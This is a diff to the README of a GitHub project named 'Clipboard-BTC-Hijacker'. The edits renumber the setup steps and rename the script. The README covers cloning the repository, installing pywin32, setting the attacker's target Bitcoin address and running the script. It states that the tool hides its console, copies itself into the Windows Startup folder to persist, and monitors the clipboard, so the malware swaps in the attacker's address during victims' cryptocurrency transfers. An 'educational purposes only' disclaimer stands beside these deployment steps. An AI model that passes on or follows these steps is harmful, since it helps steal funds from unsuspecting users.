@@ -20,15 +20,15 @@
    ```bash
    git clone https://github.com/0xxnum/Clipboard-BTC-Hijacker.git
 2. **Navigate to the Project Directory:**
-  ```bash
+   ```bash
    cd Clipboard-BTC-Hijacker
-2. **Install Dependencies: Ensure you have the required Python libraries installed. You may need pywin32:**
-  ```bash
+3. **Install Dependencies: Ensure you have the required Python libraries installed. You may need pywin32:**
+   ```bash
    pip install pywin32
-4. **Configure the Script: Edit the xnum_btc_replacer.py script to set your target Bitcoin address. Open xnum_btc_replacer.py and modify the target_btc_address variable.**
-5. **Run the Script:**
-  ```bash
-   python xnum_btc_replacer.py
+5. **Configure the Script: Edit the script.py script to set your target Bitcoin address. Open script.py and modify the target_btc_address variable.**
+6. **Run the Script:**
+   ```bash
+   python script.py
 
 Usage
 The script will hide the console window, copy itself to the Windows Startup folder for persistence, and continuously monitor the clipboard.
@@ -39,3 +39,4 @@ This script is for educational purposes only. Unauthorized use of this tool for 
 
 License
 This project is licensed under the MIT License - see the LICENSE file for details.
+
